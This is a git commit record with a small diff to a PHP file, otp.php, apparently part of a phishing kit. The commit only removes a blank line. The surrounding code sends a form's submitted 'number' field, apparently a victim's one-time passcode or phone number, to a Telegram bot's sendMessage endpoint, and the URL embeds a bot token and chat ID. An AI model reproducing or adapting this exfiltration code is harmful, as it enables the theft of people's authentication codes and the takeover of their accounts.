3f195ddda00ca5500413caff1efa5f5aeb6c5515
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-10-19 16:02:31 +0700

    Update otp.php

--- otp.php
+++ otp.php
@@ -5,7 +5,6 @@ file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmH
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=" . $_POST['number']);
 
 // logs
-
 $data = [
 'chat_id' => $Chat_ID,
 'text' => "Number: " . $_POST['number']
